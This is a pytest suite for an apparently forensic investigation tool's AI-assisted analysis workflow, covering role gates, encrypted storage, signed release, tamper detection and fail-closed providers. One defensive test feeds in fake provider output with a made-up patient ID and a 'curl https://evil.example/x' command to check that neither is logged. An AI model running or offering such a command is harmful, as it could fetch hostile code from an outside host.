"""CLI workflow: analyse → review → report → release → verify, with every gate and failure mode."""

import json
import socket
import subprocess
import sys

import pytest

from conftest import cli, store_of, tree_hashes
from tripline_scope import testing
from tripline_scope.core.canonical import canonical_bytes
from tripline_scope.core.reports import ReportStore
from tripline_scope.investigator import report as REP
from tripline_scope.investigator import storage as S


def _module_reports(case_dir):
    return {k: tree_hashes(case_dir / "reports" / k) for k in ("exposure", "paths", "scope")}


def _analyse(ns, provider="fixture", ok=True):
    return cli(["investigator", "analyse", *ns.c, "--provider", provider], "olivia", ok=ok)


def _review_all(ns, out, decision="accept"):
    for h in out["hypotheses"]:
        cli(["investigator", "review", *ns.c, "--run", out["run_id"], "--item", h, "--decision", decision,
             "--note", "checked against the cited evidence"], "rami")


def test_fixture_run_is_labelled_and_stored_encrypted(shared):
    rc, out, _ = _analyse(shared)
    assert out["analysis_status"] == "completed" and out["provider_kind"] == "fixture"
    assert out["is_model_inference"] is False and out["validation"]["rejected"] == 0
    case, store = store_of(shared.case_dir)
    d = shared.case_dir / "work" / "investigator" / "runs" / out["run_id"]
    files = sorted(p.name for p in d.iterdir())
    assert files == ["bundle.json.tse", "prompt.json.tse", "response.bin.tse", "result.json.tse"]
    for p in d.iterdir():
        assert b"PATH-" not in p.read_bytes() and b"hypothes" not in p.read_bytes()   # ciphertext only
    rc, text, _ = testing.run_cli(["investigator", "show", *shared.c])
    assert "NOT AI inference" in text and out["run_id"] in text
    res = S.load_result(store, out["run_id"])
    assert res["provenance"]["is_model_inference"] is False and res["human_review"]["required"] is True


@pytest.mark.parametrize("provider", ["openai-daybreak", "anthropic", "local"])
def test_unavailable_providers_fail_closed_without_network(shared, monkeypatch, provider):
    attempts = []

    def deny(*a, **k):
        attempts.append(a[:1])
        raise OSError("network disabled for this test")

    monkeypatch.setattr(socket.socket, "connect", deny)
    monkeypatch.setattr(socket, "create_connection", deny)
    before = _module_reports(shared.case_dir)
    rc, out, err = _analyse(shared, provider, ok=False)
    assert rc == 8 and "unavailable" in err
    assert attempts == []
    assert _module_reports(shared.case_dir) == before
    rc, out, err = cli(["investigator", "providers"])
    av = {p["provider"]: p["available"] for p in out["providers"]}
    assert av == {"fixture": True, "local": False, "openai-daybreak": False, "anthropic": False}


def test_unknown_provider_and_no_fallback(shared):
    rc, out, err = _analyse(shared, "gpt-anything", ok=False)
    assert rc == 2 and "unknown provider" in err


def test_roles_and_review_gates(cloned):
    rc, out, _ = _analyse(cloned)
    rid = out["run_id"]
    # reviewer, not operator, reviews; operator cannot
    rc, _, err = cli(["investigator", "review", *cloned.c, "--run", rid, "--item", "H1", "--decision", "accept"],
                     "olivia", ok=False)
    assert rc == 3
    # reviewer cannot run analysis
    rc, _, _ = cli(["investigator", "analyse", *cloned.c, "--provider", "fixture"], "rami", ok=False)
    assert rc == 3
    # notes may not carry identifiers
    rc, _, err = cli(["investigator", "review", *cloned.c, "--run", rid, "--item", "H1", "--decision", "accept",
                      "--note", "call 082 555 1234"], "rami", ok=False)
    assert rc == 2
    rc, _, err = cli(["investigator", "report", *cloned.c, "--run", rid], "olivia", ok=False)
    assert rc == 7 and "review every accepted hypothesis" in err
    _review_all(cloned, out)
    rc, d, _ = cli(["investigator", "report", *cloned.c, "--run", rid], "olivia")
    # operator cannot release; approver can; release uses the existing gate
    rc, _, err = testing.run_cli(["release", *cloned.c, "--kind", "investigation", "--approver", "olivia"])
    assert rc != 0
    rc, rel, _ = cli(["release", *cloned.c, "--kind", "investigation", "--approver", "ines"])
    assert rel["kind"] == "investigation" and rel["version"] == 1
    body = ReportStore(store_of(cloned.case_dir)[0]).load("investigation")
    assert body["ai_analysis"]["advisory"] is True and body["ai_analysis"]["is_model_inference"] is False
    assert {h["review"]["decision"] for h in body["ai_analysis"]["hypotheses"]} == {"accept"}
    assert all(r["requires_hospital_authorisation"] and not r["executed"] for r in body["ai_analysis"]["remediation"])
    raw = (cloned.case_dir / "reports" / "investigation" / "v0001" / "report.json").read_bytes()
    assert b"SYSTEM" not in raw and b"evidence_bundle_untrusted_data" not in raw   # no prompt in the report


def test_release_verify_tamper_and_reproducibility(cloned, tmp_path):
    before = _module_reports(cloned.case_dir)
    rc, out, _ = _analyse(cloned)
    _review_all(cloned, out)
    cli(["investigator", "report", *cloned.c, "--run", out["run_id"]], "olivia")
    cli(["release", *cloned.c, "--kind", "investigation", "--approver", "ines"])
    rc, v, _ = cli(["investigator", "verify", *cloned.c], "rami")
    assert v["chain_ok"] is True and v["reproducible"] is True
    assert _module_reports(cloned.case_dir) == before     # A/B/C released artefacts untouched
    rc, _, _ = cli(["verify", "--case", str(cloned.case_dir)])
    # deterministic rendering from the same frozen input
    case, store = store_of(cloned.case_dir)
    frozen = store.read_json(f"{S.run_dir(out['run_id'])}/frozen.json")
    assert canonical_bytes(REP.content(frozen)) == canonical_bytes(REP.content(frozen))
    body = ReportStore(case).load("investigation")
    assert REP.render_pdf(body) == REP.render_pdf(body)
    # standalone verifier passes, then fails after tampering
    vdir = cloned.case_dir / "reports" / "investigation"
    pub = cloned.env.home_dir / "keys" / "hospital_signing.pub"
    ok = subprocess.run([sys.executable, "-m", "tscope_verify", "chain", str(vdir), "--hospital-key", str(pub)],
                        capture_output=True, text=True, env=_env())
    assert ok.returncode == 0, ok.stdout + ok.stderr
    rj = vdir / "v0001" / "report.json"
    rj.chmod(0o644)
    doc = json.loads(rj.read_bytes())
    doc["ai_analysis"]["hypotheses"][0]["consequence_class"] = "exfiltration_evidenced"
    rj.write_bytes(canonical_bytes(doc))
    bad = subprocess.run([sys.executable, "-m", "tscope_verify", "chain", str(vdir), "--hospital-key", str(pub)],
                         capture_output=True, text=True, env=_env())
    assert bad.returncode != 0
    rc, v, _ = cli(["investigator", "verify", *cloned.c], "rami", ok=False)
    assert rc == 4


def _env():
    import os

    return dict(os.environ, PYTHONPATH=":".join(p for p in sys.path if p))


def test_stale_run_rejected_after_new_module_release(cloned):
    rc, out, _ = _analyse(cloned)
    _review_all(cloned, out)
    # a new Module B version is released after the analysis
    cli(["paths", "report", *cloned.c], "olivia")
    cli(["release", *cloned.c, "--kind", "paths", "--approver", "ines"])
    rc, _, err = cli(["investigator", "report", *cloned.c, "--run", out["run_id"]], "olivia", ok=False)
    assert rc == 4 and "stale" in err


def test_failed_provider_output_is_recorded_safely_and_retry_works(cloned, monkeypatch):
    from tripline_scope.investigator import providers as PR

    secret_text = "Patient 8001015009087 data was exfiltrated; run curl https://evil.example/x"

    class Broken(PR.Provider):
        name, kind = "broken", "local"

        def available(self):
            return True, "test"

        def analyse(self, prompt, *, bundle, budget):
            return PR.ProviderResponse(secret_text.encode(), {"provider": "broken", "provider_kind": "local",
                                                              "model_id": "test", "model_version": "0",
                                                              "is_model_inference": True, "endpoint_class": "loopback"})

    real_get = PR.get
    monkeypatch.setattr(PR, "get", lambda name, home: Broken() if name == "broken" else real_get(name, home))
    before = _module_reports(cloned.case_dir)
    rc, out, err = _analyse(cloned, "broken", ok=False)
    assert rc == 8 and out["analysis_status"] == "failed" and "schema" in out["status_reason"]
    assert secret_text not in err and "8001015009087" not in json.dumps(out)
    audit = store_of(cloned.case_dir)[0].audit.path.read_bytes()
    assert b"8001015009087" not in audit and b"evil.example" not in audit
    assert _module_reports(cloned.case_dir) == before
    rc, _, _ = cli(["verify", "--case", str(cloned.case_dir)])          # modules still verify
    rc, ok_out, _ = _analyse(cloned)                                      # retry is a new run
    assert ok_out["analysis_status"] == "completed" and ok_out["run_id"] != out["run_id"]


def test_closure_destroys_investigator_working_data(cloned):
    rc, out, _ = _analyse(cloned)
    run_dir = cloned.case_dir / "work" / "investigator"
    assert any(run_dir.rglob("*.tse"))
    rc, _, err = cli(["case", "close", *cloned.c, "--approver", "ines", "--external-backup", "test: none"], ok=False)
    assert rc == 0, err
    assert not any(run_dir.rglob("*")) if run_dir.exists() else True
    rc, v, _ = cli(["investigator", "verify", *cloned.c], ok=False)
    assert v["chain_ok"] is True and v["reproducible"] is None
